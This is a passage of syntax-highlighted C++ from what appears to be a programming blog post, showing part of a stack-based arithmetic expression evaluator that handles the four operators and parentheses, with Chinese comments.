class="comment">//把0pop掉</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                        result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                        mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                            result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                    <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                        result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                        mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                            result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                        result=result-mulsave.<span class="built_in">back</span>();</span><br><span class="line">                        mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                            result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            result=result-bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                    <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                    temp_result=zero_com;</span><br><span class="line">                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                        temp_result=mulsave.<span class="built_in">back</span>();</span><br><span class="line">                        mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                            temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            temp_result=temp_result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                        temp_result=temp_result*mulsave.<span class="built_in">back</span>();</span><br><span class="line">                        mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                            temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            temp_result=temp_result*bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                    mulsave.<span class="built_in">push_back</span>(temp_result);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                    <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                    temp_result=zero_com;</span><br><span class="line">                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                        temp_result=mulsave.<span class="built_in">back</span>();</span><br><span class="line">                        mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                            temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            temp_result=temp_result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                        temp_result=temp_result/mulsave.<span class="built_in">back</span>();</span><br><span class="line">                        mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                            temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            temp_result=temp_result/bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                        bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                    &#125;<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                    mulsave.<span class="built_in">push_back</span>(temp_result);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">                    <span class="comment">//不断计算算直到遇到 (</span></span><br><span class="line">                    <span class="keyword">if</span>(opstack2.<span class="built_in">top</span>()!=<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">///////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">                        <span class="keyword">switch</span> (op)&#123;<span class="comment">//用上面的东西再运算一遍</span></span><br><span class="line">                            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                                <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                                <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                                    result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                                    mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                        result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                                    result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                                    mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                                    </span><br><span class="line">                                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                        result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                                <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                                <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                                    result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                                    mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                                    </span><br><span class="line">                                     bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                        result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                                    result=result-mulsave.<span class="built_in">back</span>();</span><br><span class="line">                                    mulsave.<span class="built_in">pop_back</span>(); </span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                        result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        result=result-bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                                temp_result=zero_com;</span><br><span class="line">                                <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                                    temp_result=mulsave.<span class="built_in">back</span>();</span><br><span class="line">                                    mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                                </span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                        temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        temp_result=temp_result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                                    temp_result=temp_result*mulsave.<span class="built_in">back</span>();</span><br><span class="line">                                    mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                                    </span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                        temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        temp_result=temp_result*bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                                mulsave.<span class="built_in">push_back</span>(temp_result);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                                temp_result=zero_com;</span><br><span class="line">                                <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                                <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                                    temp_result=mulsave.<span class="built_in">back</span>();</span><br><span class="line">                                    mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                                    </span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                        temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        temp_result=temp_result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                                    temp_result=temp_result/mulsave.<span class="built_in">back</span>();</span><br><span class="line">                                    mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                                    </span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                    <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                        temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        temp_result=temp_result/bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                                    bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                                mulsave.<span class="built_in">push_back</span>(temp_result);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        cout&lt;&lt;<span class="string">&quot;将)出栈&quot;</span>&lt;&lt;endl;</span><br><span class="line">                        opstack2.<span class="built_in">pop</span>();<span class="comment">//将stack2的op )出栈</span></span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">//opstack1不空，但是opstack2空。</span></span><br><span class="line">                <span class="keyword">if</span>(opstack1.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>&amp;&amp;opstack2.<span class="built_in">top</span>()==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                    opstack1.<span class="built_in">pop</span>();</span><br><span class="line">                    opstack2.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                opstack2.<span class="built_in">push</span>(opstack1.<span class="built_in">top</span>());</span><br><span class="line">                opstack1.<span class="built_in">pop</span>();</span><br><span class="line">                bufstack2.<span class="built_in">push</span>(bufstack1.<span class="built_in">top</span>());</span><br><span class="line">                bufstack1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">//opstack2.size()&lt;1</span></span><br><span class="line">        <span class="keyword">else</span> &#123;<span class="comment">//只有一个符号或者为空.</span></span><br><span class="line">            <span class="keyword">if</span>(opstack1.<span class="built_in">empty</span>())&#123;<span class="comment">//符号栈空了，说明已经用完了，应该计算</span></span><br><span class="line">                <span class="comment">//要么是运算符号</span></span><br><span class="line">                <span class="keyword">while</span> (!opstack2.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="type">char</span> op=opstack2.<span class="built_in">top</span>();</span><br><span class="line">                    opstack2.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="keyword">switch</span> (op)&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                        <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                            result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                            </span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                            result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        </span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                        <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                            result=result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                result=result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                            result=result-mulsave.<span class="built_in">back</span>();</span><br><span class="line">                            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                result=result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                result=result-bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                        temp_result=zero_com;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                            temp_result=temp_result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                temp_result=temp_result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                            temp_result=temp_result*mulsave.<span class="built_in">back</span>();</span><br><span class="line">                            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                temp_result=temp_result*bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                        mulsave.<span class="built_in">push_back</span>(temp_result);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                        temp_result=zero_com;</span><br><span class="line">                        <span class="comment">//bufstack2.top()=bufstack2.top()+bufstack1.top();//进行运算</span></span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                            temp_result=temp_result+mulsave.<span class="built_in">back</span>();</span><br><span class="line">                            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                temp_result=temp_result+bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>() ==<span class="string">&quot;@&quot;</span> &amp;&amp; mulsave.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">                            temp_result=temp_result/mulsave.<span class="built_in">back</span>();</span><br><span class="line">                            mulsave.<span class="built_in">pop_back</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">if</span>(bufstack2.<span class="built_in">top</span>()==<span class="string">&quot;@&quot;</span>)</span><br><span class="line">                                temp_result=temp_result+<span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                temp_result=temp_result/bufstack2.<span class="built_in">top</span>();</span><br><span class="line">                            bufstack2.<span class="built_in">pop</span>();<span class="comment">//把0pop掉</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        bufstack2.<span class="built_in">push</span>(<span class="string">&quot;@&quot;</span>);<span class="comment">//推入0,是为了代替运算后的结构的数据,因为运算后的结果已经保存到COM中了</span></span><br><span class="line">                        mulsave.<span class="built_in">push_back</span>(temp_result);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span 